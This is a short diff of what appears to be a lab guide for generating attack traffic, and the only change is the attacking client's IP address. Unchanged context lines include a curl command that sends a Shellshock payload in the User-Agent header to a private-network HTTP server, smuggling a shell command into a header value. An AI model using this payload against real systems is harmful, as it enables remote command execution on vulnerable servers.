@@ -35,7 +35,7 @@ tmux new-session -d -s httpserver "python3 -m http.server"
 ```
 
 
-## ubuntu client 1 -10.0.1.4  send attack traffic
+## ubuntu client 1 -10.0.2.5  send attack traffic
 
 ```bash
 curl -v -m 5 -H 'User-Agent: () { :; }; /bin/ls' http://10.0.1.5:8000"
